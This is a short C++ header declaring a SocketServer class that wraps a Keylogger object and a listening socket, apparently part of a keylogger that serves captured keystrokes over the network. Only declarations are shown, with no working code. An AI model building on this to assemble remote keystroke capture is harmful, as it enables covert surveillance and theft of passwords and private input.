#pragma once

#include "Keylogger.h"

#define SOCKET_BUFFER_SIZE 1024

class SocketServer {
private:
	Keylogger* logger;
	SOCKET listenSocket;
public:
	SocketServer(Keylogger* logger);
	void start();
	std::wstring getResponse(std::wstring request);
	std::string getHostName();
};

